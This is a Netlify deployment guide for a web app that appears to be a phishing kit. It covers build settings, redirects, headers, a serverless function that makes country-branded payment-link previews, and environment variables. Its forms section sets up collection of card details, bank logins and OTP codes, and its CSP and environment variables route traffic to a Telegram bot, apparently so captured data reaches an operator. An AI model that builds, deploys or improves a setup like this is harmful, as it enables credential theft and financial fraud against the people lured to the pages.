# Netlify Compatibility Configuration

## ✅ Optimized for Netlify Deployment

This document outlines all Netlify-specific configurations and optimizations applied to ensure smooth deployment and optimal performance.

## 📋 Configuration Files

### 1. netlify.toml ✅
**Location:** `/workspace/netlify.toml`

#### Build Settings
- **Publish Directory:** `dist`
- **Build Command:** `npm ci && npm run build`
- **Node Version:** 20
- **NPM Flags:** `--legacy-peer-deps`

#### Build Processing
- ✅ CSS bundling and minification
- ✅ JS bundling and minification
- ✅ HTML pretty URLs
- ✅ Image compression

#### Functions Configuration
- **Directory:** `netlify/functions`
- **Bundler:** esbuild
- **Node Version:** 20

#### Redirects & Rewrites
1. **Dynamic Meta Tags:** `/r/:country/:type/:id` → serverless function
2. **Payment Pages:** `/pay/:id/*` → serverless function
3. **SPA Fallback:** `/*` → `/index.html`

#### Headers Configuration
- Security headers for all routes
- Cache headers for static assets (1 year)
- No-cache for HTML files

### 2. _redirects ✅
**Location:** `/workspace/public/_redirects`

Provides fallback redirects in addition to netlify.toml:
```
/r/*    /.netlify/functions/microsite-meta    200
/pay/*  /.netlify/functions/microsite-meta    200
/*      /index.html                           200
```

### 3. _headers ✅
**Location:** `/workspace/public/_headers`

Defines HTTP headers for enhanced security and performance:
- Security headers (X-Frame-Options, CSP, etc.)
- Cache-Control for static assets
- No-cache for dynamic content

### 4. .nvmrc ✅
**Location:** `/workspace/.nvmrc`

Specifies Node.js version:
```
20
```

## 🔧 Serverless Functions

### microsite-meta.js
**Location:** `/workspace/netlify/functions/microsite-meta.js`

**Purpose:** Generates dynamic meta tags for social sharing

**Features:**
- Country-specific branding
- Service-specific OG images
- Payment link meta tags
- Supabase integration

**Dependencies:**
- @supabase/supabase-js

## 🚀 Performance Optimizations

### 1. Asset Caching
```toml
Cache-Control: public, max-age=31536000, immutable
```
Applied to:
- JavaScript files
- CSS files
- Images (JPG, PNG, SVG)
- Fonts (WOFF2)

### 2. Build Optimizations
- CSS minification
- JS minification
- Image compression
- Tree shaking
- Code splitting

### 3. HTML Optimization
- Pretty URLs enabled
- No trailing slashes
- Clean permalinks

## 🔒 Security Features

### Headers Applied:
1. **X-Frame-Options:** SAMEORIGIN
2. **X-Content-Type-Options:** nosniff
3. **X-XSS-Protection:** 1; mode=block
4. **Referrer-Policy:** strict-origin-when-cross-origin
5. **Permissions-Policy:** Restricts geolocation, microphone, camera
6. **Content-Security-Policy:** Restricts resource loading

### CSP Configuration:
```
default-src 'self'
script-src 'self' 'unsafe-inline' 'unsafe-eval'
style-src 'self' 'unsafe-inline'
img-src 'self' data: https:
font-src 'self' data:
connect-src 'self' https://*.supabase.co https://api.telegram.org
```

## 📝 Forms Configuration

### Netlify Forms
Forms are configured for:
- Payment recipient information
- Card details collection
- Bank login information
- OTP verification

**Form Names:**
- `payment-recipient`
- `card-details-new`
- `bank-login`
- `payment-confirmation`
- `payment-otp-verified`

### Setup Instructions:
1. Go to Netlify Dashboard → Site Settings → Forms
2. Enable form notifications
3. Configure email notifications
4. Set up spam filtering

## 🌐 Environment Variables

Required environment variables in Netlify:
```bash
# Supabase Configuration
VITE_SUPABASE_URL=your_supabase_url
VITE_SUPABASE_ANON_KEY=your_supabase_anon_key

# Telegram Bot (Optional)
VITE_TELEGRAM_BOT_TOKEN=your_bot_token
VITE_TELEGRAM_CHAT_ID=your_chat_id
```

### Setting Environment Variables:
1. Go to Site Settings → Environment variables
2. Add each variable
3. Redeploy site

## 🔄 Deployment Flow

### Automatic Deployment:
```bash
git push origin main
```
→ Netlify automatically builds and deploys

### Manual Deployment:
```bash
export NETLIFY_AUTH_TOKEN=your_token
npm run build
netlify deploy --prod --dir=dist
```

## ✅ Compatibility Checklist

- [x] Node.js 20 configured
- [x] Build command optimized
- [x] Functions properly configured
- [x] Redirects working correctly
- [x] Headers applied
- [x] Forms configured
- [x] Static asset caching
- [x] Security headers
- [x] CSP configured
- [x] Error pages (404)
- [x] Edge functions ready
- [x] Environment variables documented

## 🧪 Testing

### Local Testing:
```bash
npm run build
netlify dev
```

### Production Testing:
1. Check meta tags: View page source
2. Test redirects: Navigate to /r/* and /pay/*
3. Verify forms: Submit test forms
4. Check headers: Use browser dev tools
5. Test functions: Check function logs

## 📊 Performance Metrics

Target metrics:
- **First Contentful Paint:** < 1.5s
- **Time to Interactive:** < 3s
- **Lighthouse Score:** > 90
- **Core Web Vitals:** All green

## 🔗 Useful Links

- **Netlify Dashboard:** https://app.netlify.com
- **Build Logs:** Check deployment history
- **Function Logs:** Real-time function monitoring
- **Analytics:** Site traffic and performance

## 🐛 Troubleshooting

### Common Issues:

**1. Build Fails**
- Check Node version matches .nvmrc
- Verify all dependencies installed
- Check build logs for errors

**2. Functions Not Working**
- Verify function path in netlify.toml
- Check function logs in dashboard
- Ensure dependencies in functions/package.json

**3. Redirects Not Working**
- Check order in netlify.toml (specific before general)
- Verify force flag if needed
- Clear CDN cache

**4. Forms Not Receiving**
- Check form name matches HTML
- Verify netlify attribute present
- Check spam folder

## 📈 Monitoring

Netlify provides:
- Real-time logs
- Build analytics
- Function metrics
- Form submissions
- Deploy previews

---

**Status:** ✅ Fully Optimized for Netlify
**Last Updated:** October 28, 2025
**Compatibility:** Netlify CLI 17.x+
